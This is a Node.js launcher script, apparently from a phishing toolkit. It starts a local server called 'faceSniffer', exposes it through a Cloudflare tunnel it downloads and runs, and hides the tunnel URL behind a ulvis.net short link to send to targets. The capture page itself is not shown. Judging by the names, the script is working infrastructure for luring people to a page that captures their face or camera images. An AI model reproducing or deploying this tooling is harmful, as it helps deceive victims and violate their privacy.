import fs from 'fs';
import { spawn } from 'child_process';
import gradient from 'gradient-string';
import readline from 'readline';
import path from 'path';
import axios from 'axios';
import https from 'https';

const HOST = 'localhost';
const PORT = '8080';

const consoleColors = {
    blue: ['#199cff', '#0600ba'],
    green: ['#00ffee', '#00ff62'],
    nitral: ['#c4e6ff', '#b3b1b1'],
    red: ['#cf0808', '#630000'],
    rainbow: ['#ff1f1f', '#ff9e1f', '#ffff1f', '#5ffa16', '#16fa5f', '#16fadc', '#16b9fa', '#1666fa', '#1a16fa', '#8116fa', '#d016fa', '#fa16cc']
};


const customLink = async (url) => {
    try {
        const response = await axios.post('https://ulvis.net/API/write/post', new URLSearchParams({
          url: url,
          custom: '',
          password: '',
          uses: '',
          expire: '',
          is_private: 'false',
          via: 'web'
        }), {
          headers: {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://ulvis.net',
            'Referer': 'https://ulvis.net/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'
          },
          withCredentials: true
        });
    
        if (response.data.success) {
          return response.data.data.url;
        } else {
        }
      } catch (error) {}
    }

    const install = async (url, dest) => {
        try {
            const response = await axios({
                method: 'get',
                url: url,
                responseType: 'stream',
            });
    
            if (response.status !== 200) {
                throw new Error(`Ошибка загрузки: код ${response.status}`);
            }
    
            const file = fs.createWriteStream(dest);
            response.data.pipe(file);
    
            return new Promise((resolve, reject) => {
                file.on('finish', () => {
                    file.close(resolve);
                });
                file.on('error', (err) => {
                    fs.unlink(dest, () => reject(err));
                });
            });
        } catch (error) {
            throw error;
        }
    };

const startCloudflaredTunnel = async () => {
  const cloudflaredPath = path.resolve('./.server/cloudflared');
  if (!fs.existsSync(cloudflaredPath)) {
    await install('https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm', cloudflaredPath) .then(() => {
        fs.chmodSync(cloudflaredPath, '755');
        console.log(gradient(consoleColors.green).multiline('Cloudflared успешно установлен.'));
    }).catch((error) => {
        console.error(error);
        console.log(gradient(consoleColors.red).multiline(`Ошибка загрузки Cloudflared.`));
    });
  }
  
  const cloudflared = spawn(cloudflaredPath, ['tunnel', '--url', `http://${HOST}:${PORT}`], { shell: true });

  cloudflared.stdout.on('data', (data) => {
      const output = data.toString();
      console.log(gradient(consoleColors.green)(output));

      const urlMatch = output.match(/https:\/\/.*\.trycloudflare\.com/);
      if (urlMatch) {
          const tunnelUrl = urlMatch[0];
          console.log(gradient(consoleColors.green).multiline(`Линк #1: ${tunnelUrl}`));
          customLink(tunnelUrl).then((shortUrl) => {
              console.log(gradient(consoleColors.green).multiline(`Линк #2: ${shortUrl}`));
          });
      }
  });

  cloudflared.stderr.on('data', (data) => {
      console.error("Ошибка в cloudflared:", data.toString());
  });

  cloudflared.on('close', (code) => {
      console.log(`cloudflared завершился с кодом: ${code}`);
  });

}

export const installCloudflared = async () => {
    readline.cursorTo(process.stdout, 0, 0);
    readline.clearScreenDown(process.stdout);
    console.log(gradient(consoleColors.rainbow).multiline("\n     __  __ _    _      _      _   _   \n    |  \\/  (_)__| |_ _ (_)__ _| |_| |_\n    | |\\/| | / _` | ' \\| / _` | ' \\  _|\n    |_|  |_|_\\__,_|_||_|_\\__, |_||_\\__|\n                         |___/         \n     © EHD BY VARUJAN\n     VERSION 1.0.0\n\n     Запуск сервера cloudflared\n"));

    console.log(gradient(consoleColors.green).multiline('Запуск сервера faceSniffer...'));
    spawn('npm', ['start', '--silent'], { cwd: './faceSniffer', stdio: 'inherit', shell: true });
    await startCloudflaredTunnel();
};